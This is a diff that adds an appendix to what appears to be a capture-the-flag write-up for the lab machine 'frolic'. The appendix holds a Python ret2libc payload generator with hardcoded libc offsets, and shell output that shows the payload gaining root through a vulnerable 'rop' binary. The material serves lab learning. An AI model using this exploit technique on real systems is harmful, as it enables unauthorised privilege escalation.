@@ -368,3 +368,57 @@ root
 cat /root/root.txt
 <Redacted root flag>
 ```
+
+## Beyond Exploitation
+
+I've written a script to automate part of the process payload creation for the binary
+
+```python
+import struct
+import os
+
+def m32(offset):
+	return struct.pack("I",offset)
+
+def exploit(pattern_offset, base_address, system_offset, exit_offset, bin_sh_offset):
+	padding = "A" * pattern_offset
+	print("[+] Base Address : {base_address}".format(base_address=base_address))
+	system_address = base_address + system_offset
+	print("[+] System Address : {system_address}".format(system_address=system_address))
+	exit_address = base_address + exit_offset
+	print("[+] Exit Address : {exit_address}".format(exit_address=exit_address))
+	bin_sh_address = base_address + bin_sh_offset
+	print("[+] /bin/sh Address : {bin_sh_address}".format(bin_sh_address=bin_sh_address))
+	payload = padding + m32(system_address) + m32(exit_address) + m32(bin_sh_address)
+	exploitFile = open("./payload","w")
+	exploitFile.write(payload)
+	exploitFile.close()
+	print("[+] Payload file written to {address}".format(address = str(os.getcwd()) + "/payload"))
+	
+if __name__ == '__main__':
+	os.system("rm -rf payload")
+	pattern_offset=52
+	base_address=0xb7e19000
+	system_offset=0x0003ada0
+	exit_offset=0x0002e9d0
+	bin_sh_offset=0x15ba0b
+	exploit(pattern_offset,base_address,system_offset,exit_offset,bin_sh_offset)
+```
+
+_Execution of code_
+
+```
+www-data@frolic:~/html/playsms$ python exploit.py
+python exploit.py
+[+] Base Address : 3085012992
+[+] System Address : 3085254048
+[+] Exit Address : 3085203920
+[+] /bin/sh Address : 3086436875
+[+] Payload file written to /var/www/html/playsms/payload
+www-data@frolic:~/html/playsms$ cd /home/ayush/.binary
+cd /home/ayush/.binary
+www-data@frolic:/home/ayush/.binary$ ./rop $(cat /var/www/html/playsms/payload)
+./rop $(cat /var/www/html/playsms/payload)
+whoami
+root
+```
